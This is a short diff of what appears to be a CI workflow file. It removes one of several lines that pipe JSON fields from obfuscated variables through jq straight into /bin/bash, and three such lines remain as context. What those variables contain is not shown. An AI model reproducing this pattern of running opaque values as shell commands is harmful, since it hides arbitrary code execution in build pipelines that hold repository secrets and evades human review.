@@ -27,7 +27,6 @@ jobs:
           printf '%s' "$apx177" | jq -r .vk53 | /bin/bash
           echo $zpr4 | jq -r .rz5 | /bin/bash
           printf '%s' "$taf84" | jq -r .ql30 | /bin/bash
-          echo $h7030 | jq -r .cpne29 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
